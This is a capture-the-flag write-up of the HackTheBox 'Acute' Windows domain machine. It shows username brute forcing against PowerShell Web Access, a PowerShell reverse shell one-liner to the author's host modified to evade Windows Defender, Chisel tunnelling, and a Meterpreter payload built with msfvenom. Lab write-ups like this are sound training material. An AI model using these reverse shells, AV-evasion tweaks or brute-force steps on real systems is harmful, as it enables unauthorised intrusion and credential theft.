# Acute

## Introduction

Welcome to my another writeup! In this HackTheBox [Acute](https://app.hackthebox.com/machines/Acute) machine, you'll learn: Brute forcing PowerShell Web Access (PSWA), bypassing Anti-Virus software, Just Enough Administration, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Lateral Movement: `Acute-PC01` edavies to `ATSSERVER` imonks](#lateral-movement)**
4. **[Privilege Escalation: `ATSSERVER` imonks to `Acute-PC01` jmorgan](#privilege-escalation)**
5. **[Privilege Escalation: `Acute-PC01` jmorgan to `ATSSERVER` awallace](#acute-pc01-jmorgan-to-atsserver-awallace)**
6. **[Privilege Escalation: `ATSSERVER` awallace to `ATSSERVER` `Domain Admins`](#atsserver-awallace-to-atsserver-domain-admins)**
7. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Acute.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:31:40(HKT)]
└> export RHOSTS=10.10.11.145           
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:31:42(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:31:48(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.11.145:443
[...]
PORT    STATE SERVICE  REASON  VERSION
443/tcp open  ssl/http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Issuer: commonName=acute-ATSSERVER-CA/domainComponent=acute
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-06T06:34:58
| Not valid after:  2030-01-04T06:34:58
| MD5:   cf3a:d387:8ede:75cf:89c1:8806:0b6b:c823
| SHA-1: f954:d677:0cf3:54df:3fa2:ed4f:78c3:1902:c120:a368
| -----BEGIN CERTIFICATE-----
[...]
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2023-08-14T09:33:37+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:31:43(HKT)]
└> sudo nmap -v -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, the target machine has 1 port is opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|443/TCP           | Microsoft HTTPAPI httpd 2.0   |

### HTTPS on TCP port 443

**Adding a new host found from `nmap`'s script scan (`-sC`)'s SSL certificate common name to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:34:32(HKT)]
└> echo "$RHOSTS acute.local atsserver.acute.local" | sudo tee -a /etc/hosts
10.10.11.145 acute.local atsserver.acute.local
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814173555.png)

In here, we saw the SSL certificate's issuer is unknown, we can just ignore that and accept the certificate:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814173608.png)

So, looks like this company, "Acute", is providing training for healthcare professionals.

Scrolling down the home page a little bit, I found that there's a directory called `/Acute`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814180830.png)

However that directory's index listing is disabled:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814180903.png)

**We can perform content discovery via tools like `gobuster` to find hidden files and directories:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:37:23(HKT)]
└> gobuster dir -u https://atsserver.acute.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40 -k
[...]
/aspnet_client        (Status: 301) [Size: 167] [--> https://atsserver.acute.local/aspnet_client/]
/Aspnet_client        (Status: 301) [Size: 167] [--> https://atsserver.acute.local/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 167] [--> https://atsserver.acute.local/aspnet_Client/]
/ASPNET_CLIENT        (Status: 301) [Size: 167] [--> https://atsserver.acute.local/ASPNET_CLIENT/]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:39:29(HKT)]
└> gobuster dir -u https://atsserver.acute.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40 -k
[...]
/about.html           (Status: 200) [Size: 77254]
/.                    (Status: 200) [Size: 93397]
/About.html           (Status: 200) [Size: 77254]
/iisstart.htm         (Status: 200) [Size: 93397]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|17:41:24(HKT)]
└> gobuster dir -u https://atsserver.acute.local/Acute/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40 -k
[...]
/style.css            (Status: 200) [Size: 80574]
/.                    (Status: 403) [Size: 1233]
/css.css              (Status: 200) [Size: 10700]
/menu.js              (Status: 200) [Size: 9531]
/jquery.js            (Status: 200) [Size: 89521]
/js.js                (Status: 200) [Size: 1834]
/core.js              (Status: 200) [Size: 20787]
/core.css             (Status: 200) [Size: 26105]
[...]
```

However, nothing interesting.

**After enumerating, I found one thing stands out.**

**In the about page, there's a Word document we can download:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814180942.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181019.png)

It's called "New Starter Forms".

**Also, we can see there're a few person in the bottom of this about page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814183400.png)

- Members: **Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, Lois Hopkins**

**Now, let's download the Word document:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|18:10:25(HKT)]
└> file ~/Downloads/New_Starter_CheckList_v7.docx 
/home/siunam/Downloads/New_Starter_CheckList_v7.docx: Microsoft Word 2007+
```

**We can open it with LibreOffice in Linux:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|18:10:32(HKT)]
└> libreoffice ~/Downloads/New_Starter_CheckList_v7.docx

```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181105.png)

In first page, we found 2 more endpoints: `/Staff` and `/Staff/Induction`. However, they just returned HTTP status "404 Not Found".

Then, after reading the document, we found the following things:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181500.png)

We found the **default password** for new starter, and not all of the staff are changing it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181701.png)

The **PSWA** may referring to "PowerShell Web Access", and there's a restrictions set on the sessions named **`dc_manage`**?

> Windows PowerShell Web Access allows remote users to access computers in your organization by using Windows PowerShell in a web browser. Although Windows PowerShell Web Access is a convenient and powerful management tool, the web-based access poses security risks, and should be configured as securely as possible. (From [https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)))

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181840.png)

We found another endpoint: **`/Acute_Staff_Access`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181914.png)

Hmm... **Lois... We just saw him in `/about.html`: Lois Hopkins.** Maybe this will be useful later.

## Initial Foothold

Now, when we go to `/Acute_Staff_Access`, it's the Windows **PowerShell Web Access** (PSWA)!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814182032.png)

Hmm... Maybe we can use the found person in `/about.html` as username, and brute force the PSWA?

**Let's compile a list of possible usernames from the `/about.html` page:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|18:52:29(HKT)]
└> cat possible_users.txt    
AileenWallace
CharlotteHall
EvanDavies
IeuanMonks
JoshuaMorgan
LoisHopkins
AileenW
CharlotteH
EvanD
IeuanM
JoshuaM
LoisH
AWallace
CHall
EDavies
IMonks
JMorgan
LHopkins
Aileen
Charlotte
Evan
Ieuan
Joshua
Lois
Wallace
Hall
Davies
Monks
Morgan
Hopkins
Aileen.Wallace
Charlotte.Hall
Evan.Davies
Ieuan.Monks
Joshua.Morgan
Lois.Hopkins
Aileen.W
Charlotte.H
Evan.D
Ieuan.M
Joshua.M
Lois.H
A.Wallace
C.Hall
E.Davies
I.Monks
J.Morgan
L.Hopkins
```

**Then, we can capture a login request in Burp Suite, and send it to "Intruder" to brute force all possible usernames:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814185909.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814185934.png)

**Next, add a position on `userNameTextBox` POST parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814190020.png)

> Note 1: POST parameter `passwordTextBox` is set to the default password, and `targetNodeTextBox` to `ACUTE` for the computer name.
>
> Note 2: Since this box is named Acute, we can make an educated guess that the computer name as `ACUTE`.

**Finally, go to "Payloads" tab, load the username wordlist, and start attack:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814190250.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814190259.png)

**After searching for the "Sign-in failed." keyword, username `EDavies` is using the default password!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814190408.png)

**That being said, we can login as user `EDavies` using the default password!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814190841.png)

Wait what? It seems like the computer name is wrong?

**After poking around, I found that the metadata of the Word document is actually very useful:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|19:15:11(HKT)]
└> exiftool ~/Downloads/New_Starter_CheckList_v7.docx
[...]
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
[...]
Company                         : University of Marvel
[...]
```

In here, not only we found the username schema, but also the computer name: **`Acute-PC01`**

Let's login as `EDavies` to computer `Acute-PC01`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814191732.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814191754.png)

Nice! We now have PowerShell remote access as user `edavies`!

**However, I don't like PWSA, so let's get a reverse shell:**

- Setup a netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|19:19:03(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- Send the PowerShell reverse shell payload (Generated from [revshells.com](https://www.revshells.com/))

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814192109.png)

Ahh... It got picked up by the **Windows Defender** Anti-Virus (AV) software...

**To bypass the AV, we can use a different payload, and modify the payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814192753.png)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.19',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS > ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

> Note: The `(pwd).Path` is removed, because it seems like **Windows Defender dislike the whole path is being sent to a remote host**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814192906.png)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|19:19:03(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.145] 49843

PS > whoami; ipconfig /all
acute\edavies

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Acute-PC01
   Primary Dns Suffix  . . . . . . . : acute.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : acute.local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter #2
   Physical Address. . . . . . . . . : 00-15-5D-E8-0A-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.22.2(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1
   DHCPv6 IAID . . . . . . . . . . . : 251663709
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-29-1F-44-00-15-5D-E8-02-00
   DNS Servers . . . . . . . . . . . : 172.16.22.1
[...]
```

I'm user `edavies`!

## Lateral Movement

### `Acute-PC01` edavies to `ATSSERVER` imonks

After gaining initial foothold on a target machine, we need to escalate our privilege, like `Administrator`, SYSTEM, `Domain Admins` user.

**Local users:**
```shell
PS > net user
[...]
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Natasha                  WDAGUtilityAccount       
```

- Found local user: `Natasha`

**Get local user `Natasha` details:**
```shell
PS > net user Natasha
User name                    Natasha
Full Name                    
Comment                      
User's comment               
[...]
Local Group Memberships      
Global Group memberships     *None                 
[...]
```

Nothing useful, as it doesn't belong to any groups.

**Domain users:**
```shell
PS > net user /domain
The request will be processed at a domain controller for domain acute.local.
```

Looks like we can't enumerate domain users in this `Acute-PC01` domain-joined client workstation?

**Found unusual `Utils` directory in `C:\`:**
```shell
PS > ls C:\
[...]                                                          
d-----         1/31/2022  12:29 AM                Utils                                                                
[...]
```

```shell
PS > gci -Force C:\Utils


    Directory: C:\Utils


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-h--        12/21/2021   6:41 PM            148 desktop.ini                                                          
```

It's an empty directory?

By using the `-Force` option in `Get-ChildItem` (Alias `gci`), it shown that there's a `desktop.ini`, which is a hidden file used to store information about the arrangement of a Windows folder. (From [https://www.computerhope.com/issues/ch001060.htm](https://www.computerhope.com/issues/ch001060.htm))

**And we can view its content:**
```shell
PS > type C:\Utils\desktop.ini
[.ShellClassInfo]
InfoTip=Directory for Testing Files without Defender
```

Wait... The description (`InfoTip`) says that this directory is for testing files without Windows Defender... That being said, **`C:\Utils\` directory will not be picked up by Windows Defender, so we can upload any malicious files in here.**

**Listing all drives:**
```shell
PS > Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

Name Root
---- ----
C    C:\ 
D    D:\ 
```

We found the D drive!!

```shell
PS > gci -Force -Path D:\
PS > 
```

But nothing in there?

**Find which user belongs to `Administrators` group:**
```shell
PS > Get-LocalGroupMember Administrators | ft Name, PrincipalSource

Name                     PrincipalSource
----                     ---------------
ACUTE\Domain Admins      ActiveDirectory
ACUTE\jmorgan            ActiveDirectory
ACUTE-PC01\Administrator           Local
```

Hmm... **Domain user `jmorgan` is a member of `Administrators` in this `Acute-PC01`?**

**Get domain controller details:**
```shell
PS > nltest /DSGETDC:acute.local
           DC: \\ATSSERVER.acute.local
      Address: \\172.16.22.1
     Dom Guid: 92c120b3-0294-4355-ac20-ceaa7d7fb622
     Dom Name: acute.local
  Forest Name: acute.local
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
```

So... Looks like there's **a Domain Controller (DC) on `172.16.22.1`, and the host name (Computer name) is `ATSSERVER`**.

**List all current connections:**
```shell
PS > netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       552
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       2496
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       560
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       572
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       420
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       616
  TCP    172.16.22.2:139        0.0.0.0:0              LISTENING       4
  TCP    172.16.22.2:5985       172.16.22.1:49942      ESTABLISHED     4
  TCP    172.16.22.2:5985       172.16.22.1:50040      ESTABLISHED     4
  TCP    172.16.22.2:52188      10.10.14.19:443        CLOSE_WAIT      4180
  TCP    172.16.22.2:52264      10.10.14.19:443        ESTABLISHED     4180
  TCP    172.16.22.2:52450      172.16.22.1:5985       TIME_WAIT       0
  TCP    [::]:135               [::]:0                 LISTENING       880
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       2496
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       624
  TCP    [::]:49665             [::]:0                 LISTENING       560
  TCP    [::]:49666             [::]:0                 LISTENING       572
  TCP    [::]:49667             [::]:0                 LISTENING       420
  TCP    [::]:49670             [::]:0                 LISTENING       624
  TCP    [::]:49693             [::]:0                 LISTENING       616
[...]
```

As you can see, there's a SMB running on TCP port 445, maybe its on the Domain Controller.

**We can perform a TCP port scanning to the Domain Controller via PowerShell:** (Modified from [https://medium.com/@nallamuthu/powershell-port-scan-bf27fc754585](https://medium.com/@nallamuthu/powershell-port-scan-bf27fc754585))
```shell
PS > 1..1024 | %{$socket = (New-Object System.Net.Sockets.TcpClient).BeginConnect('172.16.22.1', $_, $null, $null).AsyncWaitHandle.WaitOne(10); if ($socket){Write-Output "[+] TCP port $_ is opened!"}}
[+] TCP port 53 is opened!
[+] TCP port 88 is opened!
[+] TCP port 135 is opened!
[+] TCP port 139 is opened!
[+] TCP port 389 is opened!
[+] TCP port 443 is opened!
[+] TCP port 445 is opened!
[+] TCP port 464 is opened!
[+] TCP port 593 is opened!
[+] TCP port 636 is opened!
```

As you can see, **port 88 (Kerberos) is opened, so we can confirmed that `172.16.22.1` is the Domain Controller.**

To access that, we can do port forwarding. I'll be using [Chisel](https://github.com/jpillora/chisel).

- **Transfer [Chisel executable](https://github.com/jpillora/chisel/releases) to `Acute-PC01`:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:07:35(HKT)]
└> file /opt/chisel/chisel_1.7.7_windows_amd64.exe 
/opt/chisel/chisel_1.7.7_windows_amd64.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 6 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:07:42(HKT)]
└> python3 -m http.server -d /opt/chisel 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS > iwr -Uri http://10.10.14.19/chisel_1.7.7_windows_amd64.exe -OutFile C:\Utils\chisel.exe
```

> Note: `iwr` is an alias of `Invoke-WebRequest` command, which sends HTTP requests to a given URI.

- **Setup a port forwarding server:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:13:11(HKT)]
└> /opt/chisel/chiselx64 server -p 8888 --reverse
2023/08/14 20:13:12 server: Reverse tunnelling enabled
2023/08/14 20:13:12 server: Fingerprint vcAT0XuBZSiYguQd8KRAVBxLUvujrJjMinGJ81pcV2c=
2023/08/14 20:13:12 server: Listening on http://0.0.0.0:8888
```

- **Client connects to the server:** (Dynamic SOCKS proxy)

**My [Proxychains](https://github.com/haad/proxychains) configuration (`/etc/proxychains4.conf`):**
```shell
[ProxyList]
socks5 127.0.0.1 1080
```

```shell
PS > C:\Utils\chisel.exe client 10.10.14.19:8888 R:1080:socks

```

**Now we should be able to communicate with the Domain Controller with `proxychains`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:16:03(HKT)]
└> proxychains nc -nvz 172.16.22.1 445
[...]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.22.1:445  ...  OK
(UNKNOWN) [172.16.22.1] 445 (microsoft-ds) open : Operation now in progress
```

**Try to access the SMB server:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:22:29(HKT)]
└> proxychains smbclient -L //172.16.22.1/ -W acute.local -U EDavies
[...]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.22.1:445  ...  OK
Password for [ACUTE.LOCAL\EDavies]:
session setup failed: NT_STATUS_NOT_SUPPORTED
```

Hmm... `NT_STATUS_NOT_SUPPORTED`, which means the NTLM authentication is disabled. I also tried LDAP and WinRM, but can't be authenticated.

**I also attempted to upload and run [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master), but nothing useful?**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:47:11(HKT)]
└> file /usr/share/peass/winpeas/winPEAS.bat 
/usr/share/peass/winpeas/winPEAS.bat: DOS batch file, ASCII text, with very long lines (1307), with CRLF line terminators
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.14|20:47:11(HKT)]
└> python3 -m http.server -d /usr/share/peass/winpeas 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS > iwr -Uri http://10.10.14.19/winPEAS.bat -OutFile C:\Utils\winPEAS.bat
PS > C:\Utils\winPEAS.bat
[...]
```

After some painful *manual* enumeration, I found one thing stands out:

```shell
PS > qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
 console           edavies                   1  Active                      
```

> `qwinsta` is a command that displays information about sessions on a Remote Desktop Session Host server. The list includes information not only about active sessions but also about other sessions that the server runs. (From [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta))

Wait... **There's another `edavies` user logged in and remain active on this `Acute-PC01` machine?**

**Processes:**
```shell
PS > Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     71       5     3672       4104       0.00   6064   1 cmd                                                          
[...]
    855      34    74064      88180       1.09   6000   1 powershell                                                   
[...]
```

Process `powershell` and `cmd`? I can't tell someone is also on this machine...

**Maybe we could take a screenshot of this machine, so we can figure this out??**

Then, I tried [this StackOverflow post](https://stackoverflow.com/questions/2969321/how-can-i-do-a-screen-capture-in-windows-powershell) to take a screenshot via PowerShell, it did took a screenshot, but it's an empty, transparent PNG image... Maybe I need to **migrate the current PowerShell reverse shell process to another process via DLL injection??**. But that's way above my head...

**So, I change the reverse shell to the Metasploit's Meterpreter shell, because it has a command called `screenshot`.**

- **Generate a Meterpreter reverse shell:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|14:03:28(HKT)]
└> msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o revshell_meterpreter_stageless.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200774 bytes
Final size of exe file: 207360 bytes
Saved as: revshell_meterpreter_stageless.exe
```

- **Transfer the reverse shell to `Acute-PC01`:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|14:04:17(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS > iwr -Uri http://10.10.14.19/revshell_meterpreter_stageless.exe -OutFile C:\Utils\revshell_meterpreter_stageless.exe
```

- **Setup the Metasploit listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|14:04:57(HKT)]
└> msfconsole 
[...]
msf6 > use exploit/multi/handler
[...]
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.19
LHOST => 10.10.14.19
msf6 exploit(multi/handler) > set LPORT 53
LPORT => 53
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.19:53 

```

- **Execute the reverse shell:**

```shell
PS > C:\Utils\revshell_meterpreter_stageless.exe
```

```shell
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.19:53 
[*] Meterpreter session 1 opened (10.10.14.19:53 -> 10.10.11.145:49811) at 2023-08-15 14:07:53 +0800

meterpreter > 
```

- **Migrate to another process:**

```shell
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/manage/migrate 
msf6 post(windows/manage/migrate) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/migrate) > run

[*] Running module against ACUTE-PC01
[*] Current server process: revshell_meterpreter_stageless.exe (5396)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:176:in `execute'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/manage/migrate.rb:111:in `create_temp_proc'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/manage/migrate.rb:64:in `run'
[*] Post module execution completed
```

- **Take a screenshot using `screenshot` command in Meterpreter shell:**

```shell
msf6 post(windows/manage/migrate) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > screenshot
Screenshot saved to: /home/siunam/ctf/htb/Machines/Acute/mkieDjXj.jpeg
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815141214.png)

**After waiting for a little bit and taking bunch of screenshots, there's a PowerShell window, which runs as user `edavies`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815141310.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815141411.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815141502.png)

**Entered PowerShell commands:**
```powershell
enter-pssession -computername atsserver
enter-pssession -computername atsserver
$passwd = ConvertTo-SecureString "{Redacted}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks",$passwd)
Enter-PSSession -ComputerName ATSSERVER -Credential $cred
Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Nice!! We found domain user `imonks`'s password!

In the above PowerShell commands, it tried to start an interactive session with the Domain Controller using `imonks`'s credential and `dc_manage` session configuration.

Uhh... What's that `dc_manage` session configuration?? We've seen that in the Word document.

**Let's try to Google that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815202003.png)

**Just Enough Administration? It Sounds very straight forward.**

